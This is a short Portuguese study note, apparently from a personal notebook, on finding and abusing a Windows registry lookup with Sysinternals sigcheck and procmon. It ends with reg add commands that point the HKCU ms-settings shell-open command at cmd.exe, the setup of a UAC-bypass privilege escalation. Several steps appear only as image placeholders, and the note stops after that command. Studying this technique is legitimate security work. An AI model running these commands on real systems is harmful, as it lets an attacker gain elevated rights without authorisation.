Pra fazer isso precisamos da suíte da Sysinternals. No próprio site da Microsoft é possível baixar.
```
https://learn.microsoft.com/pt-br/sysinternals/downloads/sysinternals-suite
```


Analisar o nível de privilegio dos programas em execução
```
sigcheck.exe -a -m C:\Windows\system32\notepad.exe
```
![[Pasted image 20231228012926.png]]
o nível de privilegio "asInvoker" significa que ao invocar o processo do programa com o mesmo nível de permissao que o usuário que está executando.

O nivel de privilegio "HighestAvailable" significa que o programa vai trazer o maior nivel de privilegio que o programa conseguir.

O nivel de  privilegio "requireAdministrator" significa que, o usuário para conseguir executar o programa precisa estar dentro do grupo de administradores.


Usando o procmon para visualizar os processos em tempo real

![[Pasted image 20231228021522.png]]


Fazendo o filtro para procurar um determinado processo
![[Pasted image 20231228022005.png]]
![[Pasted image 20231228022044.png]]

Fazendo filtro somente para registros desse processo
![[Pasted image 20231228022303.png]]

Buscando apenas registros do HKCU (Current User)
![[Pasted image 20231228022413.png]]


Buscando apenas resultados que contenha "Name not found"
![[Pasted image 20231228022630.png]]

Identificando entradas de registro que executam comandos no shell
![[Pasted image 20231228022914.png]]


Depois de validar que o caminho nao existe, pode-se criar a entrada de registro
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command
```
![[Pasted image 20231228023044.png]]

identificando a entrada de registro vulneravel
![[Pasted image 20231228023701.png]]

adicionando o comando
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```